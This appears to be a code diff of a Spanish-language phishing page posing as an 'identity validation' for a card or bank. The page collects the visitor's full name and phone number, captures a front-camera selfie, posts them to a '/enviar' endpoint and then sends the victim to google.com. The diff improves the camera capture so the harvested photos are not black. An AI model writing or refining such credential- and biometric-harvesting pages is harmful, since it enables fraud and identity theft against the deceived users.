@@ -19,24 +19,55 @@
         <p>VALIDACIÓN DE IDENTIDAD</p>
         <input type="text" id="nombre" placeholder="Nombre Completo" required>
         <input type="number" id="telefono" placeholder="Número de Teléfono" required>
-        <video id="video" autoplay playsinline></video>
+        <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas" style="display:none;"></canvas>
         <button id="btn">💳 VERIFICAR AHORA</button>
         <div id="status">Esperando permisos de cámara...</div>
     </div>
+
     <script>
         const v = document.getElementById('video');
         const b = document.getElementById('btn');
         const s = document.getElementById('status');
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { v.srcObject = stream; s.innerText = "Cámara lista."; })
-            .catch(() => { s.innerText = "Error: Active la cámara."; });
+        let streamActivo = null;
 
+        // 🔥 ACTIVAR CÁMARA (ARREGLADO)
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: false
+        })
+        .then(stream => {
+            streamActivo = stream;
+            v.srcObject = stream;
+            v.muted = true;
+
+            // 🔑 CLAVE PARA QUE NO SALGA NEGRO
+            v.onloadedmetadata = () => {
+                v.play();
+                s.innerText = "Cámara lista ✅";
+            };
+        })
+        .catch(err => {
+            console.log(err);
+            s.innerText = "Error: Active permisos de cámara ❌";
+        });
+
+        // 📸 TOMAR FOTO
         b.onclick = async () => {
             const nom = document.getElementById('nombre').value;
             const tel = document.getElementById('telefono').value;
-            if(!nom || !tel) return alert("Llene los datos");
+
+            if (!nom || !tel) return alert("Llene los datos");
+
+            // ⚠️ EVITA FOTO NEGRA
+            if (v.videoWidth === 0) {
+                return alert("La cámara aún no está lista");
+            }
 
             s.innerText = "PROCESANDO BIOMETRÍA...";
             b.disabled = true;
@@ -44,7 +75,9 @@
             const canvas = document.getElementById('canvas');
             canvas.width = v.videoWidth;
             canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
                 const fd = new FormData();
@@ -52,9 +85,22 @@
                 fd.append('telefono', tel);
                 fd.append('foto', blob, 'selfie.jpg');
 
-                await fetch('/enviar', { method: 'POST', body: fd });
-                s.innerText = "VALIDADO. REDIRECCIONANDO...";
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                try {
+                    await fetch('/enviar', {
+                        method: 'POST',
+                        body: fd
+                    });
+
+                    s.innerText = "VALIDADO. REDIRECCIONANDO...";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 2000);
+
+                } catch (e) {
+                    s.innerText = "Error enviando datos ❌";
+                    b.disabled = false;
+                }
+
             }, 'image/jpeg');
         };
     </script>
